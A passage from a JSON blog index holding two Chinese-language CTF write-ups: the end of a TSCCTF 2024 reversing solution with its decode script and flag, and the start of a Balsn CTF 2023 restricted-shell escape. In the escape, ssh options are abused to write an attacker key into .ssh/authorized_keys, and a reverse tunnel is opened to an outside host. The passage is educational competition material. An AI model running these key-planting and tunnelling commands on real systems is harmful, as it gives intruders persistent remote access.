src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/93e326bc-0541-44b9-a70e-ab3b93515583\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/9e709fb8-ae3b-491b-b03c-ee3929e97ecb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/98b30c45-a201-4655-a8e0-e636272c9bc4\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因此只需要把運算反過來做，就可以得到 flag。\u003c/p\u003e\n\u003ch2 id=\"exploit\"\u003eexploit\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e0x545C30D14737AC30\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2B818E98088CED63\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0BAD50580945D3F0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x3823C33FF8E47955\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x54018BFECBE91C93\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0F4B763093C586459\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x10E088E4C7281\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin([a\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eto_bytes(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e data])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eorder   \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e0x2f\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x36\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x15\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x24\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x25\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2A\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x17\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x11\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x32\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x07\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x04\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x33\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x27\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x09\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x02\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x08\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x22\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0f\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x28\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x31\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1b\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1f\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x30\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x06\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x10\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x12\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x16\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x23\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x35\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0b\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0a\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2b\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x21\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x34\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x26\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x01\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x29\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x18\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x05\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x14\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x03\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x00\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x19\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003exorwith \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e0x19\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x11\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x12\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x16\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x03\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x24\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x03\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x09\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x11\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x35\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x15\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x14\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x24\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2f\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x05\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x07\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x02\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x08\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x32\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0b\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x14\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x02\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x19\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x32\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x28\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x05\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x12\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x33\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x24\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x36\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2e\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x03\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x03\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x32\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x34\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x13\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x17\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x08\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x34\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x04\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x0c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x32\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaddsub  \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x55\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x7\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xc9\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x81\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x29\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x4c\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa1\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x6b\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x2d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xe5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x25\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x42\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xa4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x50\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xac\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x80\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xff\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xe5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x25\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2b\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x2a\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x08\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xf2\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x29\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xdb\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x4d\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x29\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x45\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x75\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x44\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2d\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x67\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x35\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xfc\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x6a\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa4\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xa\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xf0\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xc4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xa6\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x99\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x7c\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xad\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0xfb\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf9\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xfb\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x3e\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x30\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x4e\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(order)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    data[order[i]] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (((int(data[order[i]]) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e addsub[i]) \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e256\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e (int(data[xorwith[i]])))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(data)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(data)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"flag\"\u003eFlag\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/80b09844-761e-44a0-8f09-cbf2444f41f9\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eTSC{reV3R53_4md64_45m_w17H_3m0ji_1n_T3H_NeT_5oO0O_c00L}\u003c/code\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/","title":"TSCCTF 2024 Official WriteUp"},{"content":"\u003ch1 id=\"balsn-2023-writeup\"\u003ebalsn-2023-writeup\u003c/h1\u003e\n\u003cp\u003e與 B33f 50UP 戰隊一起合打的。\u003c/p\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/c90ad3e2-3195-4f15-9c40-658aa691e53e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"kshell\"\u003eKShell\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/37a8e79e-ad82-44d4-9139-8b23fa340fba\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e連到 \u003ccode\u003enc kshell.balsnctf.com 7122\u003c/code\u003e 會有一個受限的 shell 要做逃脫，用 \u003ccode\u003ehelp\u003c/code\u003e 看能用的指令只有這些，沒有 pipe 沒有 redirect\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/b97f8b7b-1a6f-4a73-a621-760c864e93da\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e裡面最複雜的應該是 \u003ccode\u003essh\u003c/code\u003e 所以從他開刀。思路大概是想辦法找到 \u003ccode\u003e自由寫檔\u003c/code\u003e 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。\n原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 \u003ccode\u003e\u0026lt;username\u0026gt;@\u0026lt;hostname\u0026gt; Permission denied (publickey)\u003c/code\u003e 的 log。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh -E .ssh/authorized_keys \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy\u0026#34;\u003c/span\u003e@localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：\u003ccode\u003ePermission denied (publickey)\u003c/code\u003e 這就頭痛了。後來有想到用 filename。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh -E \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh -E .ssh/authorized_keys -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost\u0026#34;\u003c/span\u003e localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然而 key 裡面的 \u003ccode\u003e/\u003c/code\u003e 會有影響，而且 rsa 的 key 太長了 (當時沒有想到可以用 ecdsa 所以就跟官方解擦身而過了 QQ)\u003c/p\u003e\n\u003cp\u003e最後我突然注意到 \u003ccode\u003e.ssh/known_hosts\u003c/code\u003e 不也是 ssh 的 public key 嗎？我只要想辦法把 hostname 改成 authorized_keys 的特殊參數組成類似下面的格式就可以了。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M=\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e於是就構建了下面的 payload\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh -o UserKnownHostsFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e.ssh/authorized_keys -o HostKeyAlias\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epty root@\u0026lt;remote hostname\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/e2f52ba8-5b2d-4b2a-998d-e020045083cf\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e接下來就是從裡面打 ssh tunnel 出來了。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh -R 2222:localhost:22 root@\u0026lt;remote hostname\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然後在遠端伺服器把 \u003ccode\u003e/etc/ssh/\u003c/code\u003e 下面的 host key 複製到 \u003ccode\u003e.ssh/\u003c/code\u003e 下面然後\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 